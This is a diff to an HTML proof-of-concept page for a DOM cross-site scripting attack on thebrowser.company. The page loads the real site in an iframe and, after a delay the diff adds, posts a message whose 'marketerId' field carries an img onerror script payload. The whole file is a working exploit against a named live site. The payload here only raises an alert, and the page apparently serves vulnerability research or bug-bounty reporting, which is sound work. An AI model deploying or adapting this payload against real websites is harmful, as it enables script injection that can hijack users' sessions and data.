@@ -4,7 +4,7 @@
     <title>XSS PoC - thebrowser.company</title>
   </head>
   <body>
-    <h1>✅ PoC: DOM XSS via postMessage</h1>
+    <h1>✅ DOM XSS via postMessage (Attempt with Delay)</h1>
     <iframe id="target" src="https://thebrowser.company" width="100%" height="600" style="border: 2px solid black;"></iframe>
 
     <script>
@@ -13,18 +13,19 @@
       iframe.onload = () => {
         console.log("✅ iframe loaded");
 
-        // تأكد من أن البايلود مكتوب بصيغة سليمة
         const payload = {
           message: "OB_SHOULD_SHOW_PICKER",
           content: {
             marketerId: [
-              "<img src='x' onerror='alert(\"XSS inside thebrowser.company\")'>"
+              "<img src='x' onerror='alert(`XSS inside thebrowser.company`)'>"
             ]
           }
         };
 
-        console.log("🚀 Sending postMessage...");
-        iframe.contentWindow.postMessage(payload, "*");
+        console.log("🚀 Sending XSS payload via postMessage after 3s...");
+        setTimeout(() => {
+          iframe.contentWindow.postMessage(payload, "*");
+        }, 3000);
       };
     </script>
   </body>
